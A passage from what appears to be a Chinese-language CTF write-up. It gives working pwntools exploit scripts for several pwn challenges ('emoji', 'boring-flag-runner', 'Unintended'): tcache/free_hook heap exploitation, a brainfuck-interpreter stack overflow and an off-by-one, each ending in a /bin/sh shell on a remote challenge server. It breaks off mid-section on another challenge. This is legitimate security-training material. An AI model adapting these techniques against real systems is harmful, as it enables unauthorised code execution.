</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index to read: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index to delete: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>garbageCollect</span>():
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> _ <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>16</span>):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./emoji&#34;)</span>
</span></span><span style=display:flex><span>        sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;32994&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>8</span>):
</span></span><span style=display:flex><span>            add(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>8</span>):
</span></span><span style=display:flex><span>            delete(<span style=color:#40a070>7</span> <span style=color:#666>-</span> i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        garbageCollect()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        add(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00\x00\xD0\xa2</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 0</span>
</span></span><span style=display:flex><span>        read(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Title: &#34;</span>)
</span></span><span style=display:flex><span>        libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x70</span>
</span></span><span style=display:flex><span>        __free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>        system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x50</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x91</span>)
</span></span><span style=display:flex><span>        add(payload, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>*</span> <span style=color:#40a070>7</span> <span style=color:#60a0b0;font-style:italic># 0x80</span>
</span></span><span style=display:flex><span>        add(payload, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        add(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00\x00\x90\xa4</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 3</span>
</span></span><span style=display:flex><span>        delete(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>        garbageCollect()
</span></span><span style=display:flex><span>        delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>        garbageCollect()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x50</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x91</span>) <span style=color:#666>+</span> p64(__free_hook)
</span></span><span style=display:flex><span>        add(payload, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        add(<span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 3</span>
</span></span><span style=display:flex><span>        add(p64(system_addr), <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 4</span>
</span></span><span style=display:flex><span>        delete(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>        garbageCollect()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;echo pwned!&#34;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;pwned!&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;cat flag&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>interactive()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span></code></pre></div><h3 id=boring-flag-runner>boring-flag-runner</h3><p>和 re boring-flag-checker 有一样的二进制</p><p>实现了一个 bf 解释器，空间分配在栈上，没做边界检测，所以可以栈溢出。
远程是没有回显的</p><p><code>timeout 10 ./boring-flag-checker /tmp/$FILENAME > /dev/null</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def transOne(op):
</span></span><span style=display:flex><span>    if (op == &#39;&gt;&#39;):
</span></span><span style=display:flex><span>        return &#39;\x00&#39;
</span></span><span style=display:flex><span>    if (op == &#39;&lt;&#39;):
</span></span><span style=display:flex><span>        return &#39;\x02&#39;
</span></span><span style=display:flex><span>    if (op == &#39;+&#39;):
</span></span><span style=display:flex><span>        return &#39;\x07&#39;
</span></span><span style=display:flex><span>    if (op == &#39;-&#39;):
</span></span><span style=display:flex><span>        return &#39;\x06&#39;
</span></span><span style=display:flex><span>    if (op == &#39;.&#39;):
</span></span><span style=display:flex><span>        return &#39;\x05&#39;
</span></span><span style=display:flex><span>    if (op == &#39;,&#39;):
</span></span><span style=display:flex><span>        return &#39;\x04&#39;
</span></span><span style=display:flex><span>    if (op == &#39;[&#39;):
</span></span><span style=display:flex><span>        return &#39;\x03&#39;
</span></span><span style=display:flex><span>    if (op == &#39;]&#39;):
</span></span><span style=display:flex><span>        return &#39;\x01&#39;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def transAll(code):
</span></span><span style=display:flex><span>    vmcode = &#34;&#34;
</span></span><span style=display:flex><span>    for i in code:
</span></span><span style=display:flex><span>        vmcode += transOne(i)
</span></span><span style=display:flex><span>    return vmcode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code = &#39;&gt;&#39; * (0x130 + 0x8)
</span></span><span style=display:flex><span>code += &#39;&gt;&#39; * 8
</span></span><span style=display:flex><span>mov_0_a = &#39;[-]&#39;
</span></span><span style=display:flex><span>code += (mov_0_a + &#39;&gt;&#39;) * 0x28
</span></span><span style=display:flex><span>code += &#39;&lt;&#39; * 0x30
</span></span><span style=display:flex><span>mov_a_ap8 = &#39;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#39;
</span></span><span style=display:flex><span>code += (mov_a_ap8 + &#39;&gt;&#39;) * 0x20
</span></span><span style=display:flex><span>code += &#39;&lt;&#39; * 0x20 # back
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code += &#39;-&#39; * 0x41
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;-&#39; * 0x5
</span></span><span style=display:flex><span>code += &#39;&gt;&#39; * 7
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code += &#39;+&#39; * 0xF7
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;+&#39; * 0x05
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;+&#39; * 0x19
</span></span><span style=display:flex><span>code += &#39;&gt;&#39; * 0x6
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code += &#39;-&#39; * 0x3a
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;-&#39; * 0x1a
</span></span><span style=display:flex><span>code += &#39;&gt;&#39; * 7
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code += &#39;+&#39; * 0x5D
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;+&#39; * (0xE3 + 1)
</span></span><span style=display:flex><span>code += &#39;&gt;&#39;
</span></span><span style=display:flex><span>code += &#39;+&#39; * (0x2 + 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>vmcode = transAll(code)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#sh = process(&#34;./boring-flag-checker&#34;)
</span></span><span style=display:flex><span>sh = remote(&#34;193.57.159.27&#34;, &#34;28643&#34;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;program:&#34;, vmcode)
</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><p>有一定概率打不通，打通之后执行 <code>exec 1>&amp;0</code> 把标准输出重定向到标准输入，就可以回显了</p><h3 id=unintended>Unintended</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>!</span>strncmp(<span style=color:#4070a0>&#34;web&#34;</span>, challenges[challenge_num]<span style=color:#666>-&gt;</span>category, <span style=color:#40a070>3uLL</span>) )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          printf(<span style=color:#4070a0>&#34;New challenge description: &#34;</span>);
</span></span><span style=display:flex><span>          v6 <span style=color:#666>=</span> strlen(challenges[challenge_num]<span style=color:#666>-&gt;</span>description);
</span></span><span style=display:flex><span>          read(<span style=color:#40a070>0</span>, challenges[challenge_num]<span style=color:#666>-&gt;</span>description, v6);
</span></span><span style=display:flex><span>          puts(<span style=color:#4070a0>&#34;Patched challenge!&#34;</span>);
</span></span><span style=display:flex><span>          ctftime_rating <span style=color:#666>-=</span> <span style=color:#40a070>5</span>;
</span></span><span style=display:flex><span>        }
</span></span></code></pre></div><p>patch 功能中存在 off-by-one</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./unintended&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;59314&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>makeChallenge</span>(number, category, name, desc_size, desc, points):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;category: &#34;</span>, category)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name: &#34;</span>, name)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;length: &#34;</span>, <span style=color:#007020>str</span>(desc_size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;description: &#34;</span>, desc)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Points: &#34;</span>, <span style=color:#007020>str</span>(points))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>patchChallenge</span>(number, desc):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;description: &#34;</span>, desc)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>deployChallenge</span>(number):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>takeDownChallenge</span>(number):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x800</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 22</span>
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># 19</span>
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>2</span>) <span style=color:#60a0b0;font-style:italic># 16</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x208</span>, <span style=color:#4070a0>&#39;a&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x208</span>, <span style=color:#4070a0>&#39;a&#39;</span>), <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>0x5E0</span>, <span style=color:#4070a0>&#39;aaaaaaaa&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;a&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>deployChallenge(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Description: &#34;</span>)
</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0xa61</span>
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base: &#34;</span> <span style=color:#666>+</span> hex(heap_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>deployChallenge(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>-</span> <span style=color:#40a070>0x470</span> <span style=color:#666>+</span> <span style=color:#40a070>0x80</span>
</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> hex(libc_base)) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x290</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> (p64(<span style=color:#40a070>0x20</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>)) <span style=color:#666>*</span> <span style=color:#40a070>10</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>patchChallenge(<span style=color:#40a070>0</span>, payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>, <span style=color:#4070a0>&#39;a&#39;</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x200</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 11</span>
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># 8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>3</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:3&#39;</span>, <span style=color:#40a070>0x80</span>, <span style=color:#4070a0>&#39;a&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>3</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x200</span>, p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x91</span>) <span style=color:#666>+</span> p64(__free_hook), <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>6</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x80</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>7</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x80</span>, p64(system), <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>6</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=object-oriented-pwning>Object Oriented Pwning</h3><p>SetName 函数中存在堆溢出</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> Animal<span style=color:#666>::</span>SetName() {
</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;What will you name your new animal? &#34;</span>);
</span></span><span style=display:flex><span>    flush();
</span></span><span style=display:flex><span>    <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> c;
</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> read <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> ((c <span style=color:#666>=</span> getchar()) <span style=color:#666>!=</span> <span style=color:#4070a0>&#39;\n&#39;</span> <span style=color:#666>&amp;&amp;</span> read <span style=color:#666>&lt;</span> <span style=color:#40a070>64</span>) {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>this</span><span style=color:#666>-&gt;</span>name[read] <span style=color:#666>=</span> c;
</span></span><span style=display:flex><span>        read<span style=color:#666>++</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>对应的基类定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>class</span> <span style=color:#0e84b5;font-weight:700>Animal</span> {
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>public</span><span style=color:#666>:</span>
